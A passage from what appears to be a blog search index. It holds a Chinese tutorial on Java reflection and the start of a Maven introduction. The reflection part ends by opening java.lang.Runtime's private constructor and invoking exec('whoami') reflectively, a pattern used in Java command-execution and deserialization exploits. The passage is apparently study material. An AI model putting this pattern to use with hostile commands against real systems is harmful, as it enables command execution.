class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drop.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;人类的测试&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">display</span><span class="params">(String nation)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;国籍是：&quot;</span>+nation);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有用反射，如何创建一个类的对象，并调用其中的方法，属性。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Person p = <span class="keyword">new</span> Person();</span><br><span class="line">    p.setName(<span class="string">&quot;test1name&quot;</span>);</span><br><span class="line">    p.setAge(<span class="number">10</span>);</span><br><span class="line">    System.out.println(p);</span><br><span class="line">    p.show();</span><br><span class="line">    p.display(<span class="string">&quot;HK&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过反射构建一个类的对象，并调用其中的结构。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class&lt;Person&gt; clazz = Person.class;</span><br><span class="line">        <span class="comment">//1.创建clazz对应的运行时类Person类的对象</span></span><br><span class="line">        Person p = clazz.newInstance();</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//2.通过反射调用运行时类的指定的属性</span></span><br><span class="line">        Field f1 = clazz.getField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        f1.set(p,<span class="string">&quot;test2name&quot;</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//获取private封装的age</span></span><br><span class="line">        Field f2 = clazz.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        f2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f2.set(p,<span class="number">20</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//3.通过反射调用运行时类的指定的方法(注意方法有重载)：</span></span><br><span class="line">        Method m1 = clazz.getMethod(<span class="string">&quot;show&quot;</span>);</span><br><span class="line">        m1.invoke(p);</span><br><span class="line">        Method m2 = clazz.getMethod(<span class="string">&quot;display&quot;</span>, String.class); <span class="comment">//参数类型</span></span><br><span class="line">        m2.invoke(p,<span class="string">&quot;CH&quot;</span>);</span><br><span class="line">        System.out.println(p);</span><br></pre></td></tr></table></figure><h1 id="class类"><a href="#class类" class="headerlink" title="class类"></a>class类</h1><p>在Object类中定义了以下方法，其将被所有子类继承：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Class <span class="title">getClass</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure><blockquote><p>以上方法的返回值的类型是一个Class类，是java反射的源头。</p></blockquote><p><strong>正常方式</strong>：引入需要的包名称–&gt;通过<code>new</code>实例化 –&gt;取得实例化对象</p><p><strong>反射方式</strong>：实例化对象–&gt; <code>getClass()</code>方法–&gt;得到完整的”包类”名称</p><p>创建一个类 –编译–&gt;对应<code>.class</code>–jave.exe加载(JVM类加载器)–&gt;此<code>.class</code>文件就是一个运行时类，存在缓存区，这个运行时类本身就是一个Class的实例。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test3</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Person p = <span class="keyword">new</span> Person();</span><br><span class="line">        Class clazz = p.getClass(); <span class="comment">//通过运行时类的对象，调用其getClass()，返回其运行时类。</span></span><br><span class="line">        System.out.println(clazz);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p>1.每个运行时类只加载一次</p><p>2.有了class实例后，可做如下操作：</p><ol><li>创建对应的运行时类的对象</li><li>获取对应的运行时类的完整结构（属性、方法、构造器、内部类、父类、所在的包、异常、注释…）</li><li>调用对应的运行时类的指定的结构（属性、方法、构造器）</li><li>反射的应用：动态代理</li></ol></blockquote><h2 id="获取运行时类的对象四种方法"><a href="#获取运行时类的对象四种方法" class="headerlink" title="获取运行时类的对象四种方法"></a>获取运行时类的对象四种方法</h2><h3 id="调用运行时类本身的-class属性"><a href="#调用运行时类本身的-class属性" class="headerlink" title="调用运行时类本身的.class属性"></a>调用运行时类本身的<code>.class</code>属性</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; name1 = Runtime.class;</span><br></pre></td></tr></table></figure><blockquote><p>要明确用到类中的静态成员</p></blockquote><h3 id="通过运行时类的对象调用-getClass"><a href="#通过运行时类的对象调用-getClass" class="headerlink" title="通过运行时类的对象调用 getClass()"></a>通过运行时类的对象调用 <code>getClass()</code></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Runtime rt = Runtime.getRuntime();</span><br><span class="line">Class&lt;?&gt; name = rt.getClass();</span><br></pre></td></tr></table></figure><blockquote><p>通过Object类中的<code>getClass()</code>方法获取字节码对象，必须明确具体的类，然后创建对象。</p></blockquote><h3 id="通过Class的静态方法获取-forName-只需要类名"><a href="#通过Class的静态方法获取-forName-只需要类名" class="headerlink" title="通过Class的静态方法获取 forName() (只需要类名)"></a>通过Class的静态方法获取 <code>forName()</code> (只需要类名)</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; name = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br></pre></td></tr></table></figure><blockquote><p>只需要有类名称即可，<code>forName()</code>的静态方法JVM会装载类，并且执行<code>static()</code>中代码。</p></blockquote><h3 id="通过类的加载器"><a href="#通过类的加载器" class="headerlink" title="通过类的加载器"></a>通过类的加载器</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; name = ClassLoader.getSystemClassLoader().loadClass(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br></pre></td></tr></table></figure><blockquote><p>类似<code>forName()</code>，但不同在于<code>getSystemClassLoader().loadClass()</code><strong>不执行</strong><code>static()</code>中代码</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test4</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line">      <span class="comment">//1.调用运行时类本身的.class属性</span></span><br><span class="line">      Class clazz1 = Person.class; <span class="comment">//自己创建的类</span></span><br><span class="line">      System.out.println(clazz1.getName());</span><br><span class="line">      Class clazz2 = String.class; <span class="comment">//本身自带的</span></span><br><span class="line">      System.out.println(clazz2.getName());</span><br><span class="line">      <span class="comment">//2.通过运行时类的对象调用</span></span><br><span class="line">      Person p = <span class="keyword">new</span> Person();</span><br><span class="line">      Class clazz3 = p.getClass();</span><br><span class="line">      System.out.println(clazz3.getName());</span><br><span class="line">      <span class="comment">//3.通过Class的静态方法获取</span></span><br><span class="line">      String className = <span class="string">&quot;com.drop.test.Person&quot;</span>;</span><br><span class="line">      Class clazz4 = Class.forName(className);</span><br><span class="line">      System.out.println(clazz4.getName());</span><br><span class="line">      <span class="comment">//4.通过类的加载器</span></span><br><span class="line">      ClassLoader classLoader = <span class="keyword">this</span>.getClass().getClassLoader();</span><br><span class="line">      Class clazz5 = classLoader.loadClass(className);</span><br><span class="line">      System.out.println(clazz5.getName());</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="获取构造方法"><a href="#获取构造方法" class="headerlink" title="获取构造方法"></a>获取构造方法</h2><p>在Java的<strong>任何一个类都必须有一个或多个构造方法</strong>，如果代码中没有创建构造方法那么在类编译的时候会自动创建一个无参数的构造方法。</p><h3 id="getDeclaredConstructor"><a href="#getDeclaredConstructor" class="headerlink" title="getDeclaredConstructor()"></a><code>getDeclaredConstructor()</code></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Constructor constructor = name.getDeclaredConstructor();</span><br></pre></td></tr></table></figure><blockquote><p>没有访问构造方法权限时调用<code>constructor.setAccessible(true);</code>修改访问权限就可以成功的创建出类实例。</p></blockquote><h3 id="getConstructor"><a href="#getConstructor" class="headerlink" title="getConstructor()"></a><code>getConstructor()</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Constructor constructor = name.getConstructor();</span><br></pre></td></tr></table></figure><blockquote><p>无法获取到私有方法</p></blockquote><p><strong>构造方法有一个或多个参数的情况下我们应该在获取构造方法时候传入对应的参数类型数组</strong></p><p>如：Car类</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211231005233544.png" alt="image-20211231005233544"></p><p><code>Constructor constructor = name.getDeclaredConstructor(String.class, int.class);</code></p><p>或者如下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class[] classes = <span class="keyword">new</span> Class[] &#123; String.class, <span class="keyword">int</span>.class &#125;;</span><br><span class="line">Constructor constructor = name.getDeclaredConstructor(classes);</span><br></pre></td></tr></table></figure><p><strong>获取类的所有构造方法</strong>可以使用：<code>name.getDeclaredConstructors</code>来获取一个<code>Constructor</code>数组</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211231005050728.png" alt="image-20211231005050728"></p><blockquote><p>后续创建类实例，同理如果有参数的情况下应该传入对应的参数值，如:<code>constructor.newInstance(&quot;admin&quot;, &quot;123456&quot;)</code></p></blockquote><h2 id="获取Class类的实例"><a href="#获取Class类的实例" class="headerlink" title="获取Class类的实例"></a>获取Class类的实例</h2><p>调用Class对象的<code>newInstance()</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object runtimeInstance = constructor.newInstance();</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test10</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String className = <span class="string">&quot;com.drop.test.Person&quot;</span>;</span><br><span class="line">        ClassLoader classLoader = <span class="keyword">this</span>.getClass().getClassLoader();</span><br><span class="line">        Class clazz = classLoader.loadClass(className);</span><br><span class="line">        Object obj = clazz.newInstance();</span><br><span class="line">        Person p  = (Person) obj;</span><br><span class="line">        System.out.println(p);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="获取当前类指定的成员方法"><a href="#获取当前类指定的成员方法" class="headerlink" title="获取当前类指定的成员方法"></a>获取当前类指定的成员方法</h2><h3 id="getDeclaredMethods"><a href="#getDeclaredMethods" class="headerlink" title="getDeclaredMethods()"></a><code>getDeclaredMethods()</code></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test8</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line">Class&lt;?&gt; name = ClassLoader.getSystemClassLoader().loadClass(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">Method[] declaredMethods = name.getDeclaredMethods();</span><br><span class="line"><span class="keyword">for</span>(Method m:declaredMethods)&#123;</span><br><span class="line">System.out.println(m);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>能获取到当前类的所有成员方法(不包含父类)。</p></blockquote><h3 id="getMethods"><a href="#getMethods" class="headerlink" title="getMethods()"></a><code>getMethods()</code></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test8</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line">Class&lt;?&gt; name = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">    Method[] methods = name.getMethods();</span><br><span class="line"><span class="keyword">for</span>(Method m:methods)&#123;</span><br><span class="line">System.out.println(m);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>只能获取到<strong>当前类和父类</strong>的所有有权限的方法(如：<code>public</code>)</p></blockquote><h3 id="getMethod"><a href="#getMethod" class="headerlink" title="getMethod()"></a><code>getMethod()</code></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test8</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchMethodException </span>&#123;</span><br><span class="line">Class&lt;?&gt; name = Runtime.class;</span><br><span class="line">Method method = name.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">System.out.println(method);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>只能返回一个特定的方法，第一参数为方法名称，后面的参数为方法的参数对应Class的对象。</p></blockquote><h3 id="getDeclaredMethod"><a href="#getDeclaredMethod" class="headerlink" title="getDeclaredMethod()"></a><code>getDeclaredMethod()</code></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test8</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchMethodException </span>&#123;</span><br><span class="line">Runtime rt = Runtime.getRuntime();</span><br><span class="line">Class&lt;?&gt; name = rt.getClass();</span><br><span class="line">Method method = name.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">System.out.println(method);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>只能返回一个特定的方法，第一参数为方法名称,第二个参数名是方法参数</p></blockquote><h2 id="反射调用方法"><a href="#反射调用方法" class="headerlink" title="反射调用方法"></a>反射调用方法</h2><p>获取到<code>java.lang.reflect.Method</code>对象以后我们可以通过<code>Method</code>的<code>invoke</code>方法来调用类方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">method.invoke(方法实例对象, 方法参数值，多个参数值用<span class="string">&quot;,&quot;</span>隔开);</span><br></pre></td></tr></table></figure><p><code>method.invoke</code>的第一个参数必须是类实例对象，如果调用的是<code>static</code>方法那么第一个参数值可以传<code>null</code>，因为在java中调用静态方法是不需要有类实例的，因为可以直接<code>类名.方法名(参数)</code>的方式调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; cmdClass = curl.loadClass(<span class="string">&quot;com.drop.test.CMD&quot;</span>);</span><br><span class="line">Process process = (Process) cmdClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(<span class="keyword">null</span>,cmd);</span><br><span class="line"><span class="comment">//同下</span></span><br><span class="line">Process process = (Process) cmdClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(cmdClass,cmd);</span><br></pre></td></tr></table></figure><p><code>method.invoke</code>的第二个参数不是必须的，如果当前调用的方法没有参数，那么第二个参数可以不传，如果有参数那么就必须严格的<strong>依次传入对应的参数类型</strong>。</p><h2 id="调用类成员变量"><a href="#调用类成员变量" class="headerlink" title="调用类成员变量"></a>调用类成员变量</h2><p>Java反射不但可以获取类所有的成员变量名称，还可以无视权限修饰符实现修改对应的值。</p><h3 id="getDeclaredFields"><a href="#getDeclaredFields" class="headerlink" title="getDeclaredFields"></a>getDeclaredFields</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Field[] fields = clazz.getDeclaredFields();</span><br></pre></td></tr></table></figure><blockquote><p>获取当前类的<strong>所有</strong>成员变量</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Field field  = clazz.getDeclaredField(<span class="string">&quot;变量名&quot;</span>);</span><br></pre></td></tr></table></figure><blockquote><p>获取当前类<strong>指定</strong>的成员变量：</p></blockquote><h3 id="getFields"><a href="#getFields" class="headerlink" title="getFields"></a>getFields</h3><p>用法同上，区别同获取当前类指定的成员方法。</p><h1 id="获取Runtime类Class对象"><a href="#获取Runtime类Class对象" class="headerlink" title="获取Runtime类Class对象"></a>获取Runtime类Class对象</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//不使用反射执行本地命令代码片段 导入import org.apache.commons.io.IOUtils;</span></span><br><span class="line">      System.out.println(IOUtils.toString(Runtime.getRuntime().exec(<span class="string">&quot;whoami&quot;</span>).getInputStream(), <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">        <span class="comment">//使用反射</span></span><br><span class="line">        <span class="comment">//获取Runtime类对象</span></span><br><span class="line">        String className = <span class="string">&quot;java.lang.Runtime&quot;</span>;</span><br><span class="line">        Class runtimeClass1 = Class.forName(className);</span><br><span class="line">        <span class="comment">// 获取构造</span></span><br><span class="line">        Constructor constructor = runtimeClass1.getDeclaredConstructor();</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">// 创建Runtime类实例，等价于 Runtime rt = new Runtime();</span></span><br><span class="line">        Object runtimeInstance = constructor.newInstance();</span><br><span class="line">        <span class="comment">// 获取Runtime的exec(String cmd)方法</span></span><br><span class="line">        Method runtimeMethod = runtimeClass1.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        <span class="comment">// 调用exec方法，等价于 rt.exec(cmd);</span></span><br><span class="line">        Process process = (Process) runtimeMethod.invoke(runtimeInstance, <span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取命令执行结果</span></span><br><span class="line">        InputStream in = process.getInputStream();</span><br><span class="line">        <span class="comment">// 输出命令执行结果</span></span><br><span class="line">        System.out.println(IOUtils.toString(in, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>java.lang.Runtime</code>因为有一个<code>exec</code>方法可以执行本地命令</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>maven</title>
      <link href="/p/c6e613d8.html"/>
      <url>/p/c6e613d8.html</url>
      
        <content type="html"><![CDATA[<p>Apache Maven，是一个软件（特别是Java软件）项目管理及自动构建工具，由Apache软件基金会所提供。基于项目对象模型（缩写：POM）概念，Maven利用一个中央信息片断能管理一个项目的构建、报告和文档等步骤。</p><h1 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h1><h2 id="存在意义"><a href="#存在意义" class="headerlink" title="存在意义"></a>存在意义</h2><ol><li>项目庞大，不适合使用package来划分模块，借助于Maven将一个项目拆分成多个工程。</li><li>原本jar需要复制到<code>WEB-INF/lib</code>工程臃肿，借助于Maven将jar包保存在”仓库”中，有需要”引用”文件接口。</li><li>一个jar包依赖的其他jar包需要手动加入项目，借助于Maven将被依赖的jar包导入进来。</li></ol><p>运行时环境：其实是jar包的引用，并没有把jar包复制进工程。</p><h2 id="四大特性"><a href="#四大特性" class="headerlink" title="四大特性"></a>四大特性</h2><h3 id="依赖管理系统"><a href="#依赖管理系统" class="headerlink" title="依赖管理系统"></a>依赖管理系统</h3><p>在Java中可以用<code>groupId</code>，<code>artifactId</code>，<code>version</code>组成<code>Coordination</code>(坐标)唯一标识一个依赖。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>groupId：定义当前目录隶属的实际项目（jar包所在仓库路径）</p><p>artifactId：定义实际项目中的一个Maven模块-项目名，推荐实际项目名称作为artifactId前缀</p><p>version：Maven项目当前所处版本</p></blockquote><h3 id="多模块构建"><a href="#多模块构建" class="headerlink" title="多模块构建"></a>多模块构建</h3><h3 id="一致的项目结构"><a href="#一致的项目结构" class="headerlink" title="一致的项目结构"></a>一致的项目结构</h3><p>解决不同idea不同的目录结构</p><h3 id="一致的构建模型和插件机制"><a href="#一致的构建模型和插件机制" class="headerlink" title="一致的构建模型和插件机制"></a>一致的构建模型和插件机制</h3><h2 id="Maven安装与配置"><a href="#Maven安装与配置" class="headerlink" title="Maven安装与配置"></a>Maven安装与配置</h2><p>下载地址</p><p><a href="https://maven.apache.org/download.cgi#">https://maven.apache.org/download.cgi#</a></p><p>配置环境变量</p><p><code>MAVEN_HOME</code>    <code>D:\apache-maven-3.8.4\bin</code>    <code>%MAVEN_HOME%</code></p><h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><table><thead><tr><th>目录</th><th>描述</th></tr></thead><tbody><tr><td><code>$&#123;basedir&#125;</code></td><td>存放<code>pom.xml</code>和所有子目录。</td></tr><tr><td><code>$&#123;basedir&#125;/src/main/java</code></td><td>java源代码</td></tr><tr><td><code>$&#123;basedir&#125;/src/main/resources</code></td><td>项目的资源，如<code>property</code>文件</td></tr><tr><td><code>$&#123;basedir&#125;/src/test/java</code></td><td>项目的测试类，如<code>JUnit</code>文件</td></tr><tr><td><code>$&#123;basedir&#125;/src/test/resources</code></td><td>测试使用的资源</td></tr></tbody></table><h2 id="修改settings-xml"><a href="#修改settings-xml" class="headerlink" title="修改settings.xml"></a>修改<code>settings.xml</code></h2><h3 id="修改默认仓库位置"><a href="#修改默认仓库位置" class="headerlink" title="修改默认仓库位置"></a>修改默认仓库位置</h3><p>打开maven目录 –&gt;<code>conf/settings.xml</code></p><figure class="highlight xml"><table><tr><td 